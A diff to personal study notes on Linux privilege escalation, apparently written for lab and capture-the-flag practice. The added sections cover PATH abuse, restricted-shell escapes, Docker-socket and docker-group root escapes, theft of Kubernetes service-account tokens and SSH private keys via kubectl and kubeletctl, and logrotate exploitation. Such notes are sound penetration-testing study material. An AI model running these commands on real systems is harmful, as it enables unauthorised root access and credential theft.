@@ -1,4 +1,4 @@
-**Online resources**:  
+**Online resources**:    
 https://github.com/TCM-Course-Resources/Linux-Privilege-Escalation-Resources  
 Basic Linux Privilege Escalation - https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/  
 Linux Privilege Escalation - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md  
@@ -18,6 +18,22 @@ Check teddy
 history  
 su root  //password123  
 try exposed ssh keys  
+
+## Environment based privesc  
+### 1. PATH Abuse  
+echo $PATH, dot . in here is dangerous because it makes any current dir valid PATH for binaries  
+why dangerous.. placing a malicious ls file in /tmp and priv user runs it from /tmp - gets executed  
+also check if any unusual writable directorie - can be abused same way  
+### 2. Wildcard abuse  
+covered in cron wildcard abuse  
+### 3. Escaping Restricted Shells  
+shell that limits user's ability, ex: websense cli, rbash, rksh, rzsh    
+https://vk9-sec.com/linux-restricted-shell-bypass/  
+Examples:  
+ssh htb-user@10.129.37.149 -t "bash --noprofile"  
+ls -l `pwd`     //even though pwd is not allowed its executed when passed as argument  
+There are several methods such as command injection, substitution, chaining, environment variables, shell functions.  
+When hit with restricted shell – read and explore the articles related to specific rshell.  
 
 ## Permission based privesc  
 ### 1. Basic  
@@ -152,8 +168,29 @@ ls -l /mnt/root
 ### 4. Docker  
 #### Member of Docker group  
 docker run -v /:/mnt --rm -it bash chroot /mnt sh    //bash instead of alpine  
-#### Docker Shared library    
+#### Docker Shared library  
+- check directories that could be used by docker for persistent storage. Might find ssh keys that can be used.
 #### docker.sock exposed  
+By exposing the Docker socket over a network interface, we can remotely manage Docker hosts, issue commands, and control containers and other resources.  
+interact with docker socket, docker group member list and import new container with root filesystem mounted.  
+A case that can also occur is when the Docker socket is writable. Usually, this socket is located in /var/run/docker.sock.  
+docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash  
+
+### 5. Kubernetes: many scenarios.. shell on worker node, kubelet exposed, on container  
+steal the service token and cert at /var/run/secrets/kubernetes.io/serviceaccount/  
+use it with kubectl to check perms and list pods  
+exec into any pods and steal ssh creds -- /root/rot/.ssh/id_rsa  etc.. refer k8srta notes  
+kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods  
+kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc   
+kubeletctl to interact with worker node kubelet api..  
+
+### 6. Logrotate: /var/log   
+a tool called logrotate takes care of archiving or disposing of old logs  
+To Exploit logrotate:  
+we need write perm on log files, logrotate must be run as root or privilged user and  
+must be running on vulnerable version of 3.8.6, 3.11.0, 3.15.0,3.18.0  
+git clone https://github.com/whotwagner/logrotten  
+config stored at: /etc/logrotate.conf, /etc/logrotate.d/  
 
 ### 7. Miscellaneous techniques  
 #### Tcpdump: if can run tcpdump, capture traffic and analyze for any creds in cleartext protocols.  
@@ -178,7 +215,6 @@ id     //check our group member part of dev group
 tmux –S /shareds   //attach to the shared tmus session and confirm root privileges  
 dd  
 
-
 ## Kernel Exploits:  Kernel is an interface between software and hardware.  
 Note: Kernel exploits can cause system instability so use caution when running these against a production system.  
 And some work out of the box and some require modification.  Google kernel/OS version to find any ..  
@@ -189,8 +225,3 @@ User exploit suggester to suggest any available exploits
 Well known exploits:  
 Dirty Cow - Linux Kernel 2.6.22 < 3.9  - CVE-2016-5195 - Race condition  
 CVE-2017-16995 Linux Kernel < 4.4.0-116 – Ubuntu 16.04.4 - Buffer overflow   
-
-
-
-
-
